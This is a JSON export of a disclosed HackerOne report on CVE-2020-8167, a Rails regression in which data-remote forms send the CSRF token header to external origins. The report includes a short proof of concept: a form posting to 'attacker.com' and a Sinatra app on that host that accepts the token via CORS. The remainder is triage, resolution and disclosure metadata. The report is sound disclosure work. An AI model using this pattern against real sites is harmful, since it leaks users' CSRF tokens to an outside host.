{"id":189878,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xODk4Nzg=","url":"https://hackerone.com/reports/189878","title":"CSRF header is sent to external websites when using data-remote forms","state":"Closed","substate":"resolved","severity_rating":"low","readable_substate":"Resolved","created_at":"2016-12-09T16:27:17.706Z","submitted_at":"2016-12-09T16:27:17.706Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"mastahyeti","url":"/mastahyeti","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":22,"url":"https://hackerone.com/rails","handle":"rails","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/022/5e2b46658c8b86bed62f574d8e1793f353cbbc63_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/022/5e2b46658c8b86bed62f574d8e1793f353cbbc63_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Ruby on Rails","twitter_handle":null,"website":"http://rubyonrails.org/security","about":"Web development that doesn't hurt."}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":["CVE-2020-8167"],"singular_disclosure_disabled":false,"disclosed_at":"2020-05-26T22:38:40.225Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2020-05-18T19:40:25.372Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Looks like there is a regression in the fix for CVE-2015-1840 ([H1 report](https://hackerone.com/reports/49935)). The origin isn't being checked before adding a CSRF header to `data-remote` forms. I noticed this when checking out the new rails-ujs repo.\n\nExample Rails template:\n\n```\n\u003c%= form_tag \"http://attacker.com\", remote: true do %\u003e\n  \u003cbutton type=submit\u003esubmit\u003c/button\u003e\n\u003c% end %\u003e\n```\n\nExample http://attacker.com app\n\n```\nrequire \"sinatra\"\n\noptions '/*' do\n  headers['Access-Control-Allow-Origin'] = \"*\"\n  headers['Access-Control-Allow-Methods'] = \"POST\"\n  headers['Access-Control-Allow-Headers'] =\"x-csrf-token\"\nend\n\npost '/*' do\n  \"foo\"\nend\n```\n\nWhen the form is submitted, an XHR request to attacker.com is sent, including the `X-CSRF-Token` header.\n\nPS: @tenderlove told me to submit this here. I shouldn't get paid since I'm one of the GitHub folks who reviews these H1 submissions now.","vulnerability_information_html":"\u003cp\u003eLooks like there is a regression in the fix for CVE-2015-1840 (\u003ca href=\"https://hackerone.com/reports/49935\"\u003eH1 report\u003c/a\u003e). The origin isn\u0026#39;t being checked before adding a CSRF header to \u003ccode\u003edata-remote\u003c/code\u003e forms. I noticed this when checking out the new rails-ujs repo.\u003c/p\u003e\n\n\u003cp\u003eExample Rails template:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e\u0026lt;%= form_tag \u0026quot;http://attacker.com\u0026quot;, remote: true do %\u0026gt;\n  \u0026lt;button type=submit\u0026gt;submit\u0026lt;/button\u0026gt;\n\u0026lt;% end %\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eExample \u003ca title=\"http://attacker.com\" href=\"/redirect?url=http%3A%2F%2Fattacker.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://attacker.com\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e app\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003erequire \u0026quot;sinatra\u0026quot;\n\noptions \u0026#39;/*\u0026#39; do\n  headers[\u0026#39;Access-Control-Allow-Origin\u0026#39;] = \u0026quot;*\u0026quot;\n  headers[\u0026#39;Access-Control-Allow-Methods\u0026#39;] = \u0026quot;POST\u0026quot;\n  headers[\u0026#39;Access-Control-Allow-Headers\u0026#39;] =\u0026quot;x-csrf-token\u0026quot;\nend\n\npost \u0026#39;/*\u0026#39; do\n  \u0026quot;foo\u0026quot;\nend\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eWhen the form is submitted, an XHR request to attacker.com is sent, including the \u003ccode\u003eX-CSRF-Token\u003c/code\u003e header.\u003c/p\u003e\n\n\u003cp\u003ePS: \u003ca href=\"/tenderlove\"\u003e@tenderlove\u003c/a\u003e told me to submit this here. I shouldn\u0026#39;t get paid since I\u0026#39;m one of the GitHub folks who reviews these H1 submissions now.\u003c/p\u003e\n","weakness":{"id":45,"name":"Cross-Site Request Forgery (CSRF)"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2020-06-17T19:40:25.472Z","allow_singular_disclosure_after":-16794508.47785154,"singular_disclosure_allowed":true,"vote_count":2,"voters":["foobar7","its_afolic"],"severity":{"rating":"low","score":3.1,"author_type":"Team","metrics":{"attack_vector":"network","attack_complexity":"high","privileges_required":"none","user_interaction":"required","scope":"unchanged","confidentiality":"low","integrity":"none","availability":"none"}},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":4996290,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"Hey @mastahyeti,\n\nHackerOne is now partnering with Ruby on Rails to help them manage their incoming security vulnerability reports. As such, we are also helping clear out backlogged reports like this. Can you please check to see if this reported issue is still valid? If it's valid, we'll have our team triage it accordingly. If it's no longer valid, please close it out as N/A (without penalty).\n\nThanks in advance!\n-Alek (H1 Program Manager)","markdown_message":"\u003cp\u003eHey \u003ca href=\"/mastahyeti\"\u003e@mastahyeti\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eHackerOne is now partnering with Ruby on Rails to help them manage their incoming security vulnerability reports. As such, we are also helping clear out backlogged reports like this. Can you please check to see if this reported issue is still valid? If it\u0026#39;s valid, we\u0026#39;ll have our team triage it accordingly. If it\u0026#39;s no longer valid, please close it out as N/A (without penalty).\u003c/p\u003e\n\n\u003cp\u003eThanks in advance!\u003cbr\u003e\n-Alek (H1 Program Manager)\u003c/p\u003e\n","automated_response":false,"created_at":"2019-06-04T20:34:56.061Z","updated_at":"2019-06-04T20:34:56.061Z","actor":{"username":"mikhail1519","cleared":false,"url":"/mikhail1519","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4996444,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"I have not revalidated the submission, but I have no reason to believe that it has been fixed. ","markdown_message":"\u003cp\u003eI have not revalidated the submission, but I have no reason to believe that it has been fixed. \u003c/p\u003e\n","automated_response":false,"created_at":"2019-06-04T21:11:56.400Z","updated_at":"2019-06-04T21:11:56.400Z","actor":{"username":"mastahyeti","cleared":false,"url":"/mastahyeti","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5285013,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"Hi @mastahyeti \n\nCan you confirm if this issue is still present? This will help us determine how to validate and handle the report. \n\nThanks,\n@orangeband ","markdown_message":"\u003cp\u003eHi \u003ca href=\"/mastahyeti\"\u003e@mastahyeti\u003c/a\u003e \u003c/p\u003e\n\n\u003cp\u003eCan you confirm if this issue is still present? This will help us determine how to validate and handle the report. \u003c/p\u003e\n\n\u003cp\u003eThanks,\u003cbr\u003e\n\u003ca href=\"/orangeband\"\u003e@orangeband\u003c/a\u003e \u003c/p\u003e\n","automated_response":false,"created_at":"2019-07-09T21:56:24.153Z","updated_at":"2019-07-09T21:56:24.153Z","actor":{"username":"orangeband","cleared":false,"url":"/orangeband","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/390/540/b55c564a8a6f8099d28ea9afa41d197ad0031fc3_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":true,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5294531,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"I validated that this is still an issue on the latest release of Rails (5.2.3) using the steps described in the OP.\n\n","markdown_message":"\u003cp\u003eI validated that this is still an issue on the latest release of Rails (5.2.3) using the steps described in the OP.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-07-10T21:44:51.703Z","updated_at":"2019-07-10T21:44:51.703Z","actor":{"username":"mastahyeti","cleared":false,"url":"/mastahyeti","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"attachments":[{"id":526195,"filename":"Screen_Shot_2019-07-10_at_4.43.24_PM.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/526/195/9c9de079426268e5d0fcfdf46831f78ceff54f91/Screen_Shot_2019-07-10_at_4.43.24_PM.png?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2019-07-10_at_4.43.24_PM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2019-07-10_at_4.43.24_PM.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQWS7SVX5C%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T044854Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCICTltBX5kZS78yzw3IUUt%2Fa035OzgQ2vLu8U1ZxOKGilAiEAqT8jxmclsgLwaEL5fi7C70iqLwP7J3SWF5ypfn%2Fn%2BdUqtAMIVBABGgwwMTM2MTkyNzQ4NDkiDGRWkSc4Hmgq8mMXKCqRA0Pq%2Bzgh6dptjyRB4GzYO9sir45RVm0RyvFSB8lDBYTBiDIVL0nR3Ah5epkHqGDZZEh0G%2BfKYu%2FWpfgxJl7qllLzKg%2BOA0izVs9KPgQdxk0VWwW%2FPKL2ZT4v%2FSNRvF7rPUbZ7WhGTZqx0%2BinzKM%2BO6lDyXZKNKMzhjRnIFdI7Th01c4ma39imTXQDmxc%2FNzHFK40lrkAbTZoTlcq%2BsnIcIRSB0h4GHasXhR5OHx8rifULR7sVKHDcZMCzSYjrtagaKs9I81LEzlSbEGxIQar2MK%2BZBwmpT57aT%2F1nIOoa%2FlH5nfP4Ihcv4Mqfp19pFx8mlVoMe%2FTEx0pqNuC4lGQXowSDJKBcSjrYM6ouddZWfwY6R4O8X69XqZawGSrmBiXyAVG%2BDj895xbDJhiOXMvqkvSfsEzIfvcaHAzshzNZjFT3yiN4h81wfUF3QuLc6DHCTt1MPDYiUB8I7UCQ8wJxW4pg3xTnHqSwUeqww3YY8RFfsgvfp9PzGJ1s4vReFrzuzYVanpT22oz4w33z29yMPmMMO21qv8FOusBOsYr4rmEPt9wYTc2WNI63vM9u2VUhGNHafH2%2Fh3q6i%2BwJ0u2HLCQd44aqHfWZ%2Bc8hzInEQnRNrZf7owYuE4cHiraWaOsNJjfOEJBZu5nzzun4JSk7801NfOqa1zcgLMWOwyWJCtalb9fGn6qhwTWTBMzsOFHc661yyW%2FaqejCIRf6%2BwNOGhO8kc%2BEhEIq0iydp5k4rlMRKlFJPFlphrQYGeZgYr9TM%2FVgHlN%2Bx4Oxtcg1UwCGXMGiV%2BqXzeMEmO%2FdxKETdJJvF%2BEaJSsF0r1i7s8g61czrgyi9MKMpia%2Fg6ovVFkrvHOejV96g%3D%3D\u0026X-Amz-Signature=3baf1c0b79130bb34b972fd7c1b44e0ca378372d2e7b1000ed5238016a271f58"}],"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5357054,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @mastahyeti,\n\nThank you for your reply. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.\n\nKind regards,\n@beagle ","markdown_message":"\u003cp\u003eHi \u003ca href=\"/mastahyeti\"\u003e@mastahyeti\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eThank you for your reply. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.\u003c/p\u003e\n\n\u003cp\u003eKind regards,\u003cbr\u003e\n\u003ca href=\"/beagle\"\u003e@beagle\u003c/a\u003e \u003c/p\u003e\n","automated_response":false,"created_at":"2019-07-18T11:00:12.928Z","updated_at":"2019-07-18T11:00:12.928Z","actor":{"username":"beagle","cleared":false,"url":"/beagle","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/458/833/024b7a83a4a54282cbcdf96b9b10a93700cf8743_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5370085,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2019-07-19T12:13:12.221Z","updated_at":"2019-07-19T12:13:12.221Z","additional_data":{"old_severity":"Medium","new_severity":"Low (3.1)","old_severity_id":12855,"new_severity_id":467380},"actor":{"username":"beagle","cleared":false,"url":"/beagle","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/458/833/024b7a83a4a54282cbcdf96b9b10a93700cf8743_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5370087,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"I was able to validate your report, and have submitted it to the appropriate remediation team for review. They will let us know the final ruling on this report, and when/if a fix will be implemented. Please note that the status and severity are subject to change.\n\nKind regards,\n@beagle  ","markdown_message":"\u003cp\u003eI was able to validate your report, and have submitted it to the appropriate remediation team for review. They will let us know the final ruling on this report, and when/if a fix will be implemented. Please note that the status and severity are subject to change.\u003c/p\u003e\n\n\u003cp\u003eKind regards,\u003cbr\u003e\n\u003ca href=\"/beagle\"\u003e@beagle\u003c/a\u003e  \u003c/p\u003e\n","automated_response":false,"created_at":"2019-07-19T12:13:18.366Z","updated_at":"2019-07-19T12:13:18.366Z","actor":{"username":"beagle","cleared":false,"url":"/beagle","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/458/833/024b7a83a4a54282cbcdf96b9b10a93700cf8743_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5370092,"is_internal":false,"editable":false,"type":"Activities::ReportTitleUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2019-07-19T12:14:02.946Z","updated_at":"2019-07-19T12:14:02.946Z","additional_data":{"old_title":"CVE-2015-1840 regression","new_title":"CSRF header is sent to external websites when using data-remote forms"},"actor":{"username":"beagle","cleared":false,"url":"/beagle","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/458/833/024b7a83a4a54282cbcdf96b9b10a93700cf8743_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8038247,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Shipped","markdown_message":"\u003cp\u003eShipped\u003c/p\u003e\n","automated_response":false,"created_at":"2020-05-18T16:10:03.309Z","updated_at":"2020-05-18T16:10:03.309Z","actor":{"username":"tenderlove","cleared":false,"url":"/tenderlove","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/318/60d828744b5d16813ecbf975fdc453dc4a933f4f_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"mastahyeti","url":"/mastahyeti"},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8040952,"is_internal":false,"editable":false,"type":"Activities::NotEligibleForBounty","message":"We work coworkers when this was reported so I'm setting this bounty as ineligible. 🙇🏻‍♂️","markdown_message":"\u003cp\u003eWe work coworkers when this was reported so I\u0026#39;m setting this bounty as ineligible. 🙇🏻‍♂️\u003c/p\u003e\n","automated_response":false,"created_at":"2020-05-18T19:40:19.155Z","updated_at":"2020-05-18T19:40:19.155Z","actor":{"url":"/rails","ibb":true,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/022/5e2b46658c8b86bed62f574d8e1793f353cbbc63_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Ruby on Rails"}},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8040953,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-05-18T19:40:25.396Z","updated_at":"2020-05-18T19:40:25.396Z","first_to_agree":true,"actor":{"username":"tenderlove","cleared":false,"url":"/tenderlove","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/318/60d828744b5d16813ecbf975fdc453dc4a933f4f_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8112518,"is_internal":false,"editable":false,"type":"Activities::ManuallyDisclosed","message":"","markdown_message":"","automated_response":false,"created_at":"2020-05-26T22:38:40.155Z","updated_at":"2020-05-26T22:38:40.155Z","actor":{"username":"tenderlove","cleared":false,"url":"/tenderlove","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/318/60d828744b5d16813ecbf975fdc453dc4a933f4f_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}